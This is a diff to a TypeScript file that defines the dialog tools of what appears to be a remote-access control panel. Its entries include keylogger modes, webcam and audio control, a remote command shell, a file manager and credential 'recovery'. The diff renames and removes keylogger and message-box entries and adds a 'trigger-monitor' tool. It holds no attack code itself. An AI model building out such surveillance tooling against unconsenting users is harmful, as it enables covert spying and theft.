@@ -37,22 +37,16 @@ const definitions = {
 		segments: ['control', 'audio-control'],
 		target: 'dialog'
 	},
-	'keylogger-online': {
-		id: 'keylogger-online',
-		title: 'Keylogger · Online',
-		segments: ['control', 'keylogger', 'online'],
+	'keylogger-standard': {
+		id: 'keylogger-standard',
+		title: 'Keylogger · Standard',
+		segments: ['control', 'keylogger', 'standard'],
 		target: 'dialog'
 	},
 	'keylogger-offline': {
 		id: 'keylogger-offline',
 		title: 'Keylogger · Offline',
 		segments: ['control', 'keylogger', 'offline'],
-		target: 'dialog'
-	},
-	'keylogger-advanced-online': {
-		id: 'keylogger-advanced-online',
-		title: 'Keylogger · Advanced Online',
-		segments: ['control', 'keylogger', 'advanced-online'],
 		target: 'dialog'
 	},
 	cmd: {
@@ -115,22 +109,16 @@ const definitions = {
 		segments: ['misc', 'open-url'],
 		target: 'dialog'
 	},
-	'message-box': {
-		id: 'message-box',
-		title: 'Message Box',
-		segments: ['misc', 'message-box'],
-		target: 'dialog'
-	},
 	'client-chat': {
 		id: 'client-chat',
 		title: 'Client Chat',
 		segments: ['misc', 'client-chat'],
 		target: 'dialog'
 	},
-	'report-window': {
-		id: 'report-window',
-		title: 'Report Window',
-		segments: ['misc', 'report-window'],
+	'trigger-monitor': {
+		id: 'trigger-monitor',
+		title: 'Trigger Monitor',
+		segments: ['misc', 'trigger-monitor'],
 		target: 'dialog'
 	},
 	'ip-geolocation': {
@@ -192,9 +180,8 @@ export const dialogToolIds = [
 	'remote-desktop',
 	'webcam-control',
 	'audio-control',
-	'keylogger-online',
+	'keylogger-standard',
 	'keylogger-offline',
-	'keylogger-advanced-online',
 	'cmd',
 	'file-manager',
 	'task-manager',
@@ -205,9 +192,8 @@ export const dialogToolIds = [
 	'recovery',
 	'options',
 	'open-url',
-	'message-box',
 	'client-chat',
-	'report-window',
+	'trigger-monitor',
 	'ip-geolocation',
 	'environment-variables'
 ] as const satisfies readonly ClientToolId[];
